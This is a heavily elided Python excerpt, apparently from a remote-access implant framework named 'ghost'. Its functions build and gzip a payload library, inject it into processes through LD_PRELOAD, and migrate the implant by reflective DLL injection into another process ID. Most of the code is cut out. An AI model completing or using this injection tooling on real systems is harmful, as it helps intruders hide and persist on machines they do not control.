...
def get_payload(module, compressed=True, debug=False, from_payload=None):
    ...
    if from_payload:
        ...
        dllbuff, _, _ = ghostgen.generate_binary_from_template(
            module.log,
    ...
    dllgzbuf = BytesIO()
    gzf = gzip.GzipFile('ghost.so', 'wb', 9, dllgzbuf)
    gzf.write(dllbuff)
    gzf.close()
...
def ld_preload(module, command, wait_thread=False, keep=False, debug=False, from_payload=None):
    ...
    pid = module.client.conn.modules['ghost.agent'].ld_preload_inject_dll(
...
def migrate(module, pid, keep=False, timeout=10, debug=False, from_payload=None):
    ...
    r = module.client.conn.modules['ghost.agent'].reflective_inject_dll(
        pid, payload
    )
